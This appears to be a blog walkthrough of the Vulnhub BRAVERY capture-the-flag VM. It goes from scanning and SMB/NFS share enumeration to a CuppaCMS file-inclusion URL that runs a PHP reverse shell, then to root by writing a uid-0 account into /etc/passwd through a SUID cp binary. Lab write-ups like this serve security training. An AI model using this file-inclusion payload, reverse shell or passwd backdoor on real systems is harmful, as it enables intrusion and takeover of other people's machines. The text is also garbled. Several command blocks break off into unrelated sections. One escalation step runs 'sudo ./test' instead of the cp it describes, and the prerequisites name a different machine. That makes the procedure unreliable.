Digitalworld.local: BRAVERY, a vulnerable-by-design virtual machine from Vulnhub, rated as Easy/Beginner level machine. Designed for OSCP practice, may surprise you from the outside.
<!--exc-->


# Introduction
This machine BRAVERY VM is a part of ***Digitalworld.local*** series. It is rated **Easy/Beginner** level challenge.
This machine hopes to inspire BRAVERY in you; this machine may surprise you from the outside. This is designed for OSCP practice, and the original version of the machine was used for a CTF. It is now revived, and made more nefarious than the original.
If you MUST have hints for this machine (even though they will probably not help you very much until you root the box!): Bravery is (#1): a positive trait in people, (#2): another way of saying "try harder", (#3): https://www.youtube.com/watch?v=k2QPJ2xGMiY
Note: There may be more than one method to obtain root privileges on this machine. Look around you!

# Prerequisites
## Kali Linux / Parrot Security OS 
The virtual machine we'll use to source the attack vectors against the Kioptrix Level 1.1 virtual machine. These Linux distribution has all required tools pre-installed. Choose one of them.
* Kali Linux VM (based on Debian distribution) can be downloaded for both VMware and VirtualBox 
from [Offensive-Security](https://www.offensive-security.com/kali-linux-vm-vmware-virtualbox-image-download/)
* Parrot Security VM (based on Arch distribution with different desktop flavors) can be downloaded 
from [Parrot Security](https://www.parrotsec.org/download/) 

## Digitalworld.local: BRAVERY Vulnerable Machine
Download the virtual machine from [Vulnhub](https://www.vulnhub.com/entry/digitalworldlocal-bravery,281/), start it and give it a couple of minutes to boot. Make sure the VM and the Kali/Parrot machine are on the same network.

## Dedicated Directory
We need to create a dedicated directory in our home directory `~` for our findings. We'll use `mkdir`  and `cd` (change directory) into it:

```console
$ mkdir ~/vulnhub/bravery
$ cd ~/vulnhub/bravery/
```

## Verify our IP address
We need to verify our IP address. We'll use the `ip addr` command to list all interfaces on our machine:

```console
$ ip addr                                   
1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000
    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
    inet 127.0.0.1/8 scope host lo
       valid_lft forever preferred_lft forever
    inet6 ::1/128 scope host 
       valid_lft forever preferred_lft forever
2: eth0: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc pfifo_fast state UP group default qlen 1000
    link/ether 08:00:27:ab:08:1c brd ff:ff:ff:ff:ff:ff
    inet 10.0.0.12/24 brd 10.0.0.255 scope global dynamic noprefixroute eth0
       valid_lft 305sec preferred_lft 305sec
    inet6 fe80::a00:27ff:feab:81c/64 scope link noprefixroute 
       valid_lft forever preferred_lft forever
```

In this example, our IP is **10.0.0.12** - as can be seen under `eth0` section, which is the relevant network interface. Your IP might be different and the network interface might be called `wlan0` for example.


# Scanning
## nmap
We first need to discover the target's IP. We'll use a scan called **Ping Sweep** which will use ICMP ECHO packet to discover online hosts, without conducting further port scanning on each of the discovered host. The [nmap](https://nmap.org/) flag for such command is `-sn`. The complete command is: `sudo nmap -sn 10.0.0.0/24` where we scan the whole 254 usable IPs in the 10.0.0.0 network:

```console
$ sudo nmap -sn 10.0.0.0/24                 
[sudo] password for kali: 
Starting Nmap 7.91 ( https://nmap.org ) at 2021-01-28 15:27 EST
...
MAC Address: 08:00:27:C7:39:67 (Oracle VirtualBox virtual NIC)
Nmap scan report for 10.0.0.15
Host is up (0.00045s latency).
MAC Address: 08:00:27:9C:28:4C (Oracle VirtualBox virtual NIC)
Nmap scan report for 10.0.0.12
Host is up.
Nmap done: 256 IP addresses (5 hosts up) scanned in 2.05 seconds
```

According to the above results, our target's IP is **10.0.0.15**.

## Add IP to hosts file [OPTIONAL]
For better readability we'll add the target IP to our local `/etc/hosts` file.
Please note this command requires sudo privileges.

```console
$ sudo nano /etc/hosts

127.0.0.1       localhost
127.0.1.1       kali
10.0.0.15       bravery
...
```

Now we can use the '**bravery**' hostname instead of the IP in all the commands.

## Back to nmap
Time to run a full TCP-SYN scan to scan for open TCP ports on the target:
`sudo nmap -sV -T4 -p- -O -oN nmap bravery`
* `-sV` determine service/version info
* `-T4` for faster execution
* `-p-` scan all ports
* `-O` identify Operating System
* `-oN` output to file, in our case it's called *nmap*

```console
$ sudo nmap -sV -T4 -p- -O -oN nmap bravery 
Starting Nmap 7.91 ( https://nmap.org ) at 2021-01-28 15:30 EST

According the scan results, we can see the response size for `/0`-`/7` and `/9` paths are empty, which leave us with the following paths we need to check manually:
* http://bravery/8

![Digitalworld.local: BRAVERY - HTTP path /8](/assets/img/posts/Bravery/http-path-8.webp) _HTTP path /8_

* http://bravery/uploads/

![Digitalworld.local: BRAVERY - HTTP path /uploads](/assets/img/posts/Bravery/http-path-uploads.webp) _HTTP path /_

An interesting note is found in the `http://bravery/uploads/files/internal/department/procurement/sara/note.txt` file:
*"Remind gen to set up my cuppaCMS account."*

Some Googeling for `cuppaCMS` to look for anything we can use, such as known vulnerabilities, public exploits, login URLs.
The CMS has a [known vulnerability](https://www.exploit-db.com/exploits/25971) called **"'/alertConfigField.php' Local/Remote File Inclusion"** which allow an attacker to *"include local or remote PHP files or read non-PHP files"*. In order to exploit the vulnerability we first need to find the CMS path. The `/cuppa`, `cuppacms` and other variants of the path, leads nowhere..

![Digitalworld.local: BRAVERY - HTTP path to nowhere](/assets/img/posts/Bravery/http-path-to-nowhere.webp) _HTTP path to nowhere_

Back to the information gathered from the paths - according the `/8` URL, (port) "80 and 8080 are best friends", meaning we should look at port 8080:

![Digitalworld.local: BRAVERY - PHOTO](/assets/img/posts/Bravery/PHOTO.webp) _PHOTO_

Running **dirb** against the 8080 port:

```console
$ dirb http://bravery:8080

Let's try each path:

* robots.txt

![Digitalworld.local: BRAVERY - robots.txt](/assets/img/posts/Bravery/robots.webp) _robots.txt_

* /qwertyuiop.html:

![Digitalworld.local: BRAVERY - qwertyuiop](/assets/img/posts/Bravery/qwertyuiop.webp) _/qwertyuiop path_

Download the image and use `steghide` to check if there is any data hiding in the file:
```console
$ steghide info plainsight.jpg                                       
"plainsight.jpg":
  format: jpeg
  capacity: 2.8 KB
Try to get information about embedded data ? (y/n) y
Enter passphrase: 
steghide: could not extract any data with that passphrase!
```

We are missing the passphrase :\

According the *robots.txt* file, we should try the `/public` path. This leads us to a working website:

![Digitalworld.local: BRAVERY - 8080 public](/assets/img/posts/Bravery/8080-public.webp) _8080 /public_

The page source code (using *View-Source*) reveals an interesting HTML comment:

![Digitalworld.local: BRAVERY - 8080 public comment](/assets/img/posts/Bravery/8080-public-comment.webp) _8080 /public comment_


Exhausted our options here. We should try different way

* Shares - Found 2 shared directories: **anonymous** and **secured**
* List of local users which might be used on this or another service login

According to enum4linux, we can login to the **anonymous** shared directory **using blank username and password**.

We'll use the following command: `smbclient //TARGET_IP/SHARENAME -U USERNAME` where the username can be blank (or `''`)

The **secured** shared directory is not accessible using the command `smbclient //bravery/secured -U` as it requires a password we don't have at this point.
Let's try the **anonymous** directory using blank username and password:

```console
$ smbclient //bravery/anonymous -U

```

Using `smbget -R smb://bravery/anonymous` command we can download all other files and folders quickly to our machine.

Going over the files:
It looks like many of the files were created just to make our search harder as most of thema contain no info and therefore are 0Kb. We can use the `find . -type f  -exec du -h {} + | sort -h` command to find all files and sort them by size. output:
```console
$ find . -type f  -exec du -h {} + | sort -h
...
4.0K	./genevieve's folder/CMS/migration/important!
4.0K	./genevieve's folder/email/spear
4.0K	./kenny's folder/vuln_assessment_team/windows/XP_disclaimer
4.0K	./patrick's folder/work!/present_for_qiu/present
4.0K	./patrick's folder/work!/samba/david_secured_share/readme/readme.txt
4.0K	./sara's folder/email/2048
4.0K	./sara's folder/gossip_corner/gossip18
4.0K	./sara's folder/gossip_corner/gossip23
4.0K	./sara's folder/gossip_corner/gossip27
4.0K	./sara's folder/gossip_corner/gossip5
```
Now we can go over each of the files with content (>0Kb). There's nothing useful unfortunately.

## NFS Share (port 2049)
We'll use showmount to *"show mount information for an NFS server"*. The `-e` flag to show the NFS server's export list.

```console
$ showmount -e bravery
Export list for bravery:
/var/nfsshare *
```

Which means we can mount the target's **/var/nfsshare/** directory.
Step-by-step:
* Create a new directory to mount the remote directory to - `mkdir ./nfsshare`
* mount the remote nfs directory - `sudo mount -t nfs bravery:/var/nfsshare ./nfsshare` where the `-t` flag is used to specify the filesystem type, which in our case is `nfs`
* Now we can browse the remote files easily. I used the `find` command we used before to get easier access to the list of files with content.

* ./discovery
`Remember to LOOK AROUND YOU!`

* ./itinerary/david
```console
David will need to fly to various cities for various conferences. Here is his schedule.
...
```

* ./password.txt
`Passwords should not be stored in clear-text, written in post-its or written on files on the hard disk!`

* ./qwertyuioplkjhgfdsazxcvbnm
`Sometimes, the answer you seek may be right before your very eyes.`

That last file name might be a password we can use. If you recall we have a list of users and a secure shared directory called **"secured"**. Both were found using ***enum4linux***.
We'll try to login to the secured directory with the potential password we've found above
After a couple of tries we're able to login as ***david*** - `smbclient //bravery/secured -U david`.
In the shared folder we found 3 files:
```console
smb: \> ls
  .                                   D        0  Fri Sep 28 09:52:14 2018
  ..                                  D        0  Thu Jun 14 12:30:39 2018
  david.txt                           N      376  Sat Jun 16 04:36:07 2018
  genevieve.txt                       N      398  Mon Jul 23 12:51:27 2018
  README.txt                          N      323  Mon Jul 23 21:58:53 2018
```

We can download the file to our machine using the `get FILENAME` command. Here's the content two relevant files:

* david.txt
```
I have concerns over how the developers are designing their webpage. The use of "developmentsecretpage" is too long and unwieldy. We should cut short the addresses in our local domain.

1. Reminder to tell Patrick to replace "developmentsecretpage" with "devops".

2. Request the intern to adjust her Favourites to http://<developmentIPandport>/devops/directortestpagev1.php.
```

* genevieve.txt
```
Hi! This is Genevieve!

We are still trying to construct our department's IT infrastructure; it's been proving painful so far.

If you wouldn't mind, please do not subject my site (http://192.168.254.155/genevieve) to any load-test as of yet. We're trying to establish quite a few things:

a) File-share to our director.
b) Setting up our CMS.
c) Requesting for a HIDS solution to secure our host.
```


# Gaining Access
The above files contain multiple URLs we should try. The `http://bravery/genevieve` holds the **CuppaCMS** we're after from the beginning of this VM :)

![Digitalworld.local: BRAVERY - path to CuppaCMS](/assets/img/posts/Bravery/http-path-genevieve.webp) _path to CuppaCMS_

The top navigation bar include a link to the cms login page `http://bravery/genevieve/cuppaCMS/index.php`

![Digitalworld.local: BRAVERY - path to CuppaCMS login](/assets/img/posts/Bravery/http-path-genevieve-login.webp) _path to CuppaCMS login_

This is also the `/cuppaCMS/` path vulnerable to the known exploit we found earlier.
According the exploit-db page, we can evaluate PHP code, which means we can **execute** PHP code!
Using pentestmonkey's php-reverse-shell code we can generate a PHP shell to create a reverse shell. The steps we need to take are:
1. Download the file from Github: https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php
2. Change the host IP according to your IP address + relevant port
3. Move the file into the nfsshare directory
4. Use netcat to open a listening port for our reverse shell
5. Using Browser, go to: bravery/genevieve/cuppaCMS/alerts/alertConfigField.php?urlConfig=../../../../../../../../../var/nfsshare/rshell.php to execute our shell
6. Profit! An active shell on the system as the apache user where we can read the user flag:

```console
$ nc -lvp1337
listening on [any] 1337 ...

# Privilege Escalation
## SUID
We'll search for any file we can run using sudo user using the `find / -perm -u=s -type f 2>/dev/null` command

```console
$ find / -perm -u=s -type f 2>/dev/null
/usr/bin/cp
/usr/bin/chfn
/usr/bin/chsh
/usr/bin/fusermount
/usr/bin/chage
/usr/bin/gpasswd

/usr/libexec/abrt-action-install-debuginfo-to-abrt-cache
```

According the above, we can use `cp` command as sudo. In order to exploit this misconfiguration we'll:
1. Copy /etc/passwd to a location we can edit it
2. Add a sudo user
3. Copy the back and overwrite the old one
4. Switch user to our new (root!) user
5. Find the root flag

Add a new user by concatinating new record to the `/etc/passwd` file
[READING Materials](https://www.cyberciti.biz/faq/understanding-etcshadow-file/)
First we need to choose a password, salt it and hash the result. openssl to the rescue.
Flags:
* `-1` what hashing algorithm to use. In our use case it doesnt matter, therefore we use MD5 which should be avoided in real world PT as it is not secure.
* `-salt salt` string to use as salt. I choose the string salt
* `password` clear text password we would like to use. 

```console
$ openssl passwd -1 -salt salt password
$1$salt$qJH7.N4xYta3aEG/dfqo/0
```

We need to put the above string in a file. For that we need to find a directory we can write to. Easiest option is `/tmp`. I'll call my file `my_user`
Before writing the above hashed password we need to add some data in order for it to be aligned with the `/etc/passwd` format.
This is the final result:
```console
$ cat /tmp/my_user
`hful:$1$salt$qJH7.N4xYta3aEG/dfqo/0:0:0::/root:/bin/bash`
```

I named the user `hful`.
Now we can execute the test script as sudo
`sudo ./test /tmp/my_user /etc/passwd`

Verify our new user was added
```console
$ cat /etc/passwd
...
hful:$1$salt$qJH7.N4xYta3aEG/dfqo/0:0:0::/root:/bin/bash
```

Copy the file back to the original location and overwrite the old one. Now switch to the new user and verify we're root.

```console
$ su hful
Password: 

$id
uid=0(root) gid=0(root) groups=0(root)
```

Find and print the flag

```
$ cd /root
$ ls
...
proof.txt
...
$ cat proof.txt
Congratulations on rooting BRAVERY. :)
```

# Summary
* This machine has sooo many potential rabbit-holes. We can use simple scripts such as the `find . -type f  -exec du -h {} + | sort -h` which will save us time going over empty files.
